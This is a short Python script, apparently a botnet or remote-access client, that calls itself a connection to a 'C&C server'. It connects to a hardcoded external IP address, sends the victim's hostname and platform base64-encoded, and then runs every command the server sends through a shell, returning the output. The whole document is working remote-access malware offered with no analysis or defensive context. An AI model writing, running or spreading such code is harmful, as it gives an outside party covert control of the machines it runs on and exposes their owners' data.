import socket
import base64
import platform
import subprocess
import os

MAX_CONNECTIONS = 5
address_to_server = ('176.115.90.172', 12397)
# address_to_server = ('localhost', 12397)


sock = socket.socket()

print(f'Connecting to the C&C server...')
sock.connect(address_to_server)

sock.send(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform()).encode('utf-8')))
print('Connected')


while True:
    data = sock.recv(1024)
    print(f'server command: {base64.b64decode(data).decode("utf-8")}')
    try:
        output = subprocess.check_output(base64.b64decode(data).decode("utf-8"), shell=True)
    except:
        output = 'error'
    sock.send(base64.b64encode(output))
